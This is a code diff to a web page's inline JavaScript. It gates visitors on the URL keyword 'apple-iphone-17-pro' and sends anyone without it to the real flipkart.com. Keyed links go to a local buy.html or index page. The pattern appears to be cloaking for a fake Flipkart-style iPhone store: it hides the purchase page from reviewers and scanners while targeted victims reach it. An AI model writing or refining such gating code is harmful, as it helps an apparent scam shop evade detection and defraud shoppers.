@@ -6,21 +6,31 @@
     <script>
       (function() {
         var VERIFY_KEYWORD = 'apple-iphone-17-pro';
-        var href = window.location.href;
+        var href = window.location.href.toLowerCase();
 
-        // Check if verify keyword exists in requested URL
-        if (href.indexOf(VERIFY_KEYWORD) !== -1) {
-          var repo = '/kk';
-          var path = window.location.pathname.substring(repo.length);
-          var search = window.location.search;
-          var hash = window.location.hash;
-          
-          // Pass the original long path cleanly via URL query param
-          var redirectUrl = repo + '/?p=' + encodeURIComponent(path + search + hash);
-          window.location.replace(redirectUrl);
-        } else {
-          // If unauthorized/wrong link
+        var hasKeyword = href.indexOf(VERIFY_KEYWORD) !== -1;
+        var hasBuy = href.indexOf('buy.html') !== -1;
+
+        // 1. If keyword is NOT present -> Go to Flipkart (even if buy.html is present)
+        if (!hasKeyword) {
           window.location.replace('https://www.flipkart.com');
+          return;
+        }
+
+        // Base repository path
+        var repo = '/kk';
+        var path = window.location.pathname.substring(repo.length);
+        var search = window.location.search;
+        var hash = window.location.hash;
+        var fullTarget = encodeURIComponent(path + search + hash);
+
+        // 2. Keyword present AND "buy.html" is in link -> Send to buy.html
+        if (hasBuy) {
+          window.location.replace(repo + '/buy.html?p=' + fullTarget);
+        } 
+        // 3. Keyword present but NO "buy.html" -> Send to index.html
+        else {
+          window.location.replace(repo + '/?p=' + fullTarget);
         }
       })();
     </script>
